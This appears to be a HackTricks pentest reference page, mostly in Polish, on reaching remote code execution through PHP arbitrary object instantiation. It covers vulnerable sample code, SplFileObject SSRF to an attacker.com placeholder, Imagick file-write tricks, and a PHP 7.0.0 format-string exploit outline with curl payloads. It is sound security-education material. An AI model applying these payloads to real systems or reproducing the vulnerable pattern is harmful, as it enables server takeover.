# PHP - RCE wykorzystywanie tworzenia obiektów: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

This is basically a summary of [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Wprowadzenie

Tworzenie nowych dowolnych obiektów, takich jak `new $_GET["a"]($_GET["a"])`, może prowadzić do Remote Code Execution (RCE), jak opisano w [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Niniejszy dokument przedstawia różne strategie osiągnięcia RCE.

## RCE przez własne klasy lub autoloading

Składnia `new $a($b)` służy do tworzenia instancji obiektu, gdzie **`$a`** oznacza nazwę klasy, a **`$b`** jest pierwszym argumentem przekazywanym do konstruktora. Zmienne te mogą pochodzić z danych wejściowych od użytkownika jak GET/POST, gdzie mogą być stringami lub tablicami, albo z JSON, gdzie mogą występować jako inne typy.

Rozważ poniższy fragment kodu:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
W tym przypadku ustawienie `$a` na `App` lub `App2` i `$b` na polecenie systemowe (np. `uname -a`) powoduje wykonanie tego polecenia.

**Funkcje autoloadingu** można wykorzystać, jeśli takie klasy nie są bezpośrednio dostępne. Funkcje te automatycznie ładują klasy z plików, gdy są potrzebne i są definiowane za pomocą `spl_autoload_register` lub `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Zachowanie mechanizmu autoloadingu różni się między wersjami PHP, oferując różne możliwości RCE.

## RCE przez wbudowane klasy

W przypadku braku własnych klas lub autoloaderów, **wbudowane klasy PHP** mogą wystarczyć do RCE. Ich liczba wynosi od około 100 do 200, w zależności od wersji PHP i zainstalowanych rozszerzeń. Można je wypisać za pomocą `get_declared_classes()`.

Konstruktory warte uwagi można zidentyfikować przy użyciu reflection API, jak pokazano w poniższym przykładzie oraz pod linkiem [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE przez specyficzne metody obejmuje:**

### **SSRF + Phar Deserialization**

Klasa `SplFileObject` umożliwia SSRF za pomocą swojego konstruktora, pozwalając na połączenia z dowolnym URL:
```php
new SplFileObject('http://attacker.com/');
```
SSRF może prowadzić do deserialization attacks w wersjach PHP przed 8.0, wykorzystując protokół Phar.

### **Exploiting PDOs**

Konstruktor klasy PDO pozwala na połączenia z bazami danych za pomocą ciągów DSN, co potencjalnie umożliwia tworzenie plików lub inne interakcje:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Wersje PHP do 5.3.22 oraz 5.4.12 były podatne na ataki XXE poprzez konstruktory `SoapClient` i `SimpleXMLElement`, w zależności od wersji libxml2.

## RCE przez rozszerzenie Imagick

W analizie **zależności projektu** odkryto, że **Imagick** może być wykorzystany do **wykonywania poleceń** przez tworzenie nowych obiektów. Stwarza to możliwość eksploatacji podatności.

### VID parser

Zidentyfikowano, że parser VID ma możliwość zapisu zawartości do dowolnej wskazanej ścieżki w systemie plików. Może to doprowadzić do umieszczenia PHP shell w katalogu dostępnym przez web, osiągając Remote Code Execution (RCE).

#### VID Parser + File Upload

Zauważono, że PHP tymczasowo przechowuje przesłane pliki w `/tmp/phpXXXXXX`. Parser VID w Imagick, wykorzystujący protokół **msl**, potrafi obsługiwać znaki wieloznaczne w ścieżkach plików, umożliwiając przeniesienie pliku tymczasowego do wybranej lokalizacji. Metoda ta daje dodatkową drogę do osiągnięcia arbitralnego zapisu plików w systemie plików.

### PHP Crash + Brute Force

Metoda opisana w [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) polega na przesyłaniu plików, które powodują crash serwera przed ich usunięciem. Poprzez brute-forcing nazwy pliku tymczasowego, Imagick może wykonać arbitralny kod PHP. Jednak technika ta okazała się skuteczna tylko w przestarzałej wersji ImageMagick.

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

Gdy nazwa klasy jest kontrolowana przez dane wejściowe użytkownika (np. `new $_GET['model']()`), w PHP 7.0.0 wprowadzono przejściowy błąd podczas refaktoryzacji `Throwable`, w którym silnik błędnie traktował nazwę klasy jako format string dla printf podczas rozwiązywania. To umożliwia klasyczne prymitywy w stylu printf w PHP: leaks with `%p`, kontrolę liczby zapisów przez specyfikatory szerokości oraz arbitralne zapisy z `%n` przeciwko wskaźnikom w procesie (np. wpisy GOT w buildach ELF).

Minimalny przykład odtwarzający podatność:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
Zarys eksploatacji (wg referencji):
- Leak adresy za pomocą `%p` w nazwie klasy, aby znaleźć adres umożliwiający zapis:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- Użyj parametrów pozycyjnych i specyfikatorów szerokości, aby ustawić dokładną liczbę bajtów, następnie `%n`, aby zapisać tę wartość pod adresem dostępnym na stosie, celując w slot GOT (np. `free`), aby częściowo nadpisać go na `system`.
- Wywołaj przejętą funkcję, przekazując nazwę klasy zawierającą shell pipe, by osiągnąć `system("id")`.

Uwagi:
- Działa tylko na PHP 7.0.0 (Bug [#71105](https://bugs.php.net/bug.php?id=71105)); naprawione w kolejnych wydaniach. Ważność: krytyczna, jeśli istnieje możliwość arbitralnego tworzenia instancji klasy.
- Typowe payloads łączą wiele `%p`, aby przeszukiwać stos, a następnie `%.<width>d%<pos>$n`, aby doprowadzić do częściowego nadpisania.

## Źródła

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../../banners/hacktricks-training.md}}
